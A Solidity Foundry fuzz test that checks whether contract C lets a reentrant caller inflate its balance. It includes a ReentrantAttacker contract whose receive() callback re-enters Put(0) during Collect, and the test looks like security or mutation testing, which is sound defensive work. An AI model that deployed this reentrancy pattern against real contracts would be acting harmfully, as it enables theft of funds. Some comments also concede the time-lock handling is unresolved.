pragma solidity ^0.8.0;
import {Test} from "forge-std/Test.sol";
import {C} from "../src/C_under_test.sol";

contract InvMutTest is Test {
    C c;
    address reentrant;

    function setUp() public {
        c = new C(address(this));
        reentrant = address(new ReentrantAttacker(c));
    }

    function testFuzz_property(uint256 depositAmount, uint256 collectAmount) public {
        // Bound amounts to avoid overflow and keep them within reasonable range
        depositAmount = bound(depositAmount, 1 ether, 1000 ether);
        collectAmount = bound(collectAmount, 1 ether, depositAmount);

        // Ensure the attacker has enough ETH to deposit
        vm.deal(reentrant, depositAmount);

        // Give the contract some initial ETH to cover the subtract overflow test (needs balance >= collectAmount)
        vm.deal(address(c), 1000 ether);

        // Attacker deposits, then triggers reentrancy via Collect
        vm.prank(reentrant);
        ReentrantAttacker(reentrant).attack(depositAmount, collectAmount);

        // After attack, sum of all account balances must equal total ETH deposited into C
        // totalDeposited = depositAmount (only the attacker deposited)
        // sumBalances = c.Acc(reentrant).balance
        uint256 totalDeposited = depositAmount;
        uint256 sumBalances = c.Acc(reentrant).balance;

        // The invariant: all ETH deposited by users is accounted for in their balances
        // The bug allows balance to be inflated beyond actual deposits, so sumBalances > totalDeposited
        assertTrue(sumBalances <= totalDeposited, "Reentrancy allowed balance inflation");
    }
}

contract ReentrantAttacker {
    C public target;
    uint256 internal collectAmt;
    bool internal hasReentered;

    constructor(C _target) {
        target = _target;
    }

    function attack(uint256 depositAmt, uint256 _collectAmt) external payable {
        collectAmt = _collectAmt;
        hasReentered = false;
        // Deposit funds
        target.Put{value: depositAmt}(block.timestamp + 1 days);
        // Warp past unlock time
        // (We can't warp inside a call, so we set a future unlock time and rely on vm.warp in test)
        // Instead, we'll just call Collect; the reentrancy will occur via receive
        target.Collect(_collectAmt);
    }

    receive() external payable {
        if (!hasReentered) {
            hasReentered = true;
            // Re-enter Put to inflate balance without sending ETH
            target.Put(0);
        }
    }
}

